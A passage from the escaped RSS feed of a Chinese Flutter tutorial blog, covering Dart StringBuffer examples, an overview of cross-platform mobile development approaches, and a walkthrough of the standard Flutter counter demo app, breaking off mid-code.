&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;resume&amp;#34;&lt;/span&gt;;
print(str.replaceAll(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#39;e&amp;#39;&lt;/span&gt;),&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;é&amp;#39;&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3字符串变量&#34;&gt;3.字符串变量&lt;/h2&gt;
&lt;h3 id=&#34;a属性-2&#34;&gt;a.属性&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;StringBuffer strBuf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuffer();
    strBuf.write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sow nothing,reap nothing.&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回字符串缓冲区的哈希码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(strBuf.hashCode);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 字符串缓冲区是否为空
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(strBuf.isEmpty);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 字符串缓冲区是否不为空
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(strBuf.isNotEmpty);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回字符串缓冲区累积内容的长度
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(strBuf.length);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回对象运行时的类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(runtimeType);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b方法-2&#34;&gt;b.方法&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;StringBuffer strBuf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuffer();
    &lt;span style=&#34;color:#75715e&#34;&gt;// 添加字符串到字符串缓冲区内
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    strBuf.write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Do one thing at a time,and do well.&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回字符串缓冲区的所有内容
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(strBuf.toString());
    &lt;span style=&#34;color:#75715e&#34;&gt;// 清除字符串缓冲区
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    strBuf.clear();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—混合开发</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91/</link>
        <pubDate>Fri, 23 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://book.flutterchina.club/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;《Flutter实战》@wendux &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1原生开发&#34;&gt;1.原生开发&lt;/h2&gt;
&lt;p&gt;原生应用程序是指某一个移动平台（比如iOS或安卓）所特有的应用，使用相应平台支持的开发工具和语言，并直接调用系统提供的SDK API。比如Android原生应用就是指使用Java或Kotlin语言直接调用Android SDK开发的应用程序；而iOS原生应用就是指通过Objective-C或Swift语言直接调用iOS SDK开发的应用程序。原生开发有以下主要优势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可访问平台全部功能（GPS、摄像头）；&lt;/li&gt;
&lt;li&gt;速度快、性能高、可以实现复杂动画及绘制，整体用户体验好；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;平台特定，开发成本高；不同平台必须维护不同代码，人力成本随之变大；&lt;/li&gt;
&lt;li&gt;内容固定，动态化弱，大多数情况下，有新功能更新时只能发版；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在移动互联网发展初期，业务场景并不复杂，原生开发还可以应对产品需求迭代。 但近几年，随着物联网时代到来、移动互联网高歌猛进，日新月异，在很多业务场景中，传统的纯原生开发已经不能满足日益增长的业务需求。主要表现在：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态化内容需求增大；当需求发生变化时，纯原生应用需要通过版本升级来更新内容，但应用上架、审核是需要周期的，这对高速变化的互联网时代来说是很难接受的，所以，对应用动态化(不发版也可以更新应用内容)的需求就变的迫在眉睫。&lt;/li&gt;
&lt;li&gt;业务需求变化快，开发成本变大；由于原生开发一般都要维护Android、iOS两个开发团队，版本迭代时，无论人力成本，还是测试成本都会变大。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总结一下，纯原生开发主要面临动态化和开发成本两个问题，而针对这两个问题，诞生了一些跨平台的动态化框架。&lt;/p&gt;
&lt;h2 id=&#34;2跨平台技术简介&#34;&gt;2.跨平台技术简介&lt;/h2&gt;
&lt;p&gt;针对原生开发面临问题，人们一直都在努力寻找好的解决方案，而时至今日，已经有很多跨平台框架(注意，本书中所指的跨平台若无特殊说明，即特指Android和iOS两个平台)，根据其原理，主要分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;H5+原生（Cordova、Ionic、微信小程序）&lt;/li&gt;
&lt;li&gt;JavaScript开发+原生渲染 （React Native、Weex、快应用）&lt;/li&gt;
&lt;li&gt;自绘UI+原生(QT for mobile、Flutter)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在接下来的章节中我们逐个来看看这三类框架的原理及优缺点。&lt;/p&gt;
&lt;h3 id=&#34;ah5原生混合开发&#34;&gt;a.H5+原生混合开发&lt;/h3&gt;
&lt;p&gt;这类框架主要原理就是将APP的一部分需要动态变动的内容通过H5来实现，通过原生的网页加载控件WebView (Android)或WKWebView（iOS）来加载（以后若无特殊说明，我们用WebView来统一指代android和iOS中的网页加载控件）。这样以来，H5部分是可以随时改变而不用发版，动态化需求能满足；同时，由于h5代码只需要一次开发，就能同时在Android和iOS两个平台运行，这也可以减小开发成本，也就是说，H5部分功能越多，开发成本就越小。我们称这种h5+原生的开发模式为混合开发，采用混合模式开发的APP我们称之为混合应用或Hybrid APP ，如果一个应用的大多数功能都是H5实现的话，我们称其为Web APP 。&lt;/p&gt;
&lt;p&gt;目前混合开发框架的典型代表有：Cordova、Ionic 和微信小程序，值得一提的是微信小程序目前是在webview中渲染的，并非原生渲染，但将来有可能会采用原生渲染。&lt;/p&gt;
&lt;p&gt;如之前所述，原生开发可以访问平台所有功能，而混合开发中，H5代码是运行在WebView中，而WebView实质上就是一个浏览器内核，其JavaScript依然运行在一个权限受限的沙箱中，所以对于大多数系统能力都没有访问权限，如无法访问文件系统、不能使用蓝牙等。所以，对于H5不能实现的功能，都需要原生去做。而混合框架一般都会在原生代码中预先实现一些访问系统能力的API， 然后暴露给WebView以供JavaScript调用，这样一来，WebView就成为了JavaScript与原生API之间通信的桥梁，主要负责JavaScript与原生之间传递调用消息，而消息的传递必须遵守一个标准的协议，它规定了消息的格式与含义，我们把依赖于WebView的用于在JavaScript与原生之间通信并实现了某种消息传输协议的工具称之为WebView JavaScript Bridge, 简称 JsBridge，它也是混合开发框架的核心。&lt;/p&gt;
&lt;h3 id=&#34;bjavascript开发原生渲染&#34;&gt;b.JavaScript开发+原生渲染&lt;/h3&gt;
&lt;p&gt;React Native (简称RN)是Facebook于2015年4月开源的跨平台移动应用开发框架，是Facebook早先开源的JS框架 React 在原生移动应用平台的衍生产物，目前支持iOS和Android两个平台。RN使用Javascript语言，类似于HTML的JSX，以及CSS来开发移动应用，因此熟悉Web前端开发的技术人员只需很少的学习就可以进入移动应用开发领域。&lt;/p&gt;
&lt;h3 id=&#34;c自绘ui原生&#34;&gt;c.自绘UI+原生&lt;/h3&gt;
&lt;p&gt;在本篇中，我们看看最后一种跨平台技术：&lt;strong&gt;自绘UI+原生&lt;/strong&gt;。这种技术的思路是，通过在不同平台实现一个统一接口的渲染引擎来绘制UI，而不依赖系统原生控件，所以可以做到不同平台UI的一致性。注意，自绘引擎解决的是UI的跨平台问题，如果涉及其它系统能力调用，依然要涉及原生开发。这种平台技术的优点如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;性能高；由于自绘引擎是直接调用系统API来绘制UI，所以性能和原生控件接近。&lt;/li&gt;
&lt;li&gt;灵活、组件库易维护、UI外观保真度和一致性高；由于UI渲染不依赖原生控件，也就不需要根据不同平台的控件单独维护一套组件库，所以代码容易维护。由于组件库是同一套代码、同一个渲染引擎，所以在不同平台，组件显示外观可以做到高保真和高一致性；另外，由于不依赖原生控件，也就不会受原生布局系统的限制，这样布局系统会非常灵活。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不足：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态性不足；为了保证UI绘制性能，自绘UI系统一般都会采用AOT模式编译其发布包，所以应用发布后，不能像Hybrid和RN那些使用JavaScript（JIT）作为开发语言的框架那样动态下发代码。&lt;/li&gt;
&lt;li&gt;开发效率低：QT使用C++作为其开发语言，而编程效率是直接会影响APP开发效率的，C++作为一门静态语言，在UI开发方面灵活性不及JavaScript这样的动态语言，另外，C++需要开发者手动去管理内存分配，没有JavaScript及Java中垃圾回收（GC）的机制。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也许你已经猜到Flutter就属于这一类跨平台技术，没错，&lt;strong&gt;Flutter正是实现一套自绘引擎，并拥有一套自己的UI布局系统&lt;/strong&gt;。不过，自绘制引擎的思路并不是什么新概念，Flutter并不是第一个尝试这么做的，在它之前有一个典型的代表，即大名鼎鼎的QT。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205050931735.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205050931735.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Flutter—例程</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E4%BE%8B%E7%A8%8B/</link>
        <pubDate>Thu, 22 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E4%BE%8B%E7%A8%8B/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://book.flutterchina.club/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;《Flutter实战》@wendux &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1例程代码&#34;&gt;1.例程代码&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  runApp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MyApp&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyApp&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatelessWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; MaterialApp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
      title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Flutter Demo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
      theme&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; ThemeData&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        primarySwatch&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Colors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;blue&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      home&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; MyHomePage&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Flutter Demo Home Page&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyHomePage&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatefulWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  MyHomePage&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;Key key&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;key&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; key&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String title&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  _MyHomePageState &lt;span style=&#34;color:#a6e22e&#34;&gt;createState&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; _MyHomePageState&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_MyHomePageState&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; State&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;MyHomePage&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; _counter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_incrementCounter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    setState&lt;span style=&#34;color:#f92672&#34;&gt;(()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
      _counter&lt;span style=&#34;color:#f92672&#34;&gt;++;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Scaffold&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
      appBar&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; AppBar&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;widget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      body&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Center&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Column&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
          mainAxisAlignment&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; MainAxisAlignment&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;center&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
          children&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;[&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
              &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You have pushed the button this many times:&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
            Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
              &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$_counter&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
              style&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Theme&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;of&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;textTheme&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;headline4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
          &lt;span style=&#34;color:#f92672&#34;&gt;],&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      floatingActionButton&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; FloatingActionButton&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        onPressed&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; _incrementCounter&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
        tooltip&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Increment&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
        child&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Icon&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Icons&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; 
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2代码分析&#34;&gt;2.代码分析&lt;/h2&gt;
&lt;h3 id=&#34;1应用结构&#34;&gt;1）应用结构&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyApp&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatelessWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; MaterialApp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;//应用名称  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Flutter Demo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 
      theme&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ThemeData&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;//蓝色主题  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        primarySwatch&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Colors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;blue&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;//应用首页路由  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      home&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; MyHomePage&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Flutter Demo Home Page&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;MyApp 类代表 Flutter 应用，它继承自 StatelessWidget 类。&lt;/li&gt;
&lt;li&gt;在 Flutter 中，大多数东西都是以 widget 的形式提供，包括对齐(alignment)、填充(padding)和布局(layout)等。&lt;/li&gt;
&lt;li&gt;Flutter 在构建页面时，会调用组件的 build 方法，widget 的主要工作是提供一个 build() 方法来描述如何构建 UI 界面（通常是通过组合、拼装其它基础 widget）。&lt;/li&gt;
&lt;li&gt;MaterialApp 是 Material 库中提供的 Flutter APP 框架，通过它可以设置应用的名称、主题、语言、首页及路由列表等。MaterialApp 也是一个 widget。&lt;/li&gt;
&lt;li&gt;home 为 Flutter 应用的首页，它也是一个 widget。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2首页&#34;&gt;2）首页&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyHomePage&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatefulWidget &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  MyHomePage&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;Key key&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;key&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; key&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String title&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
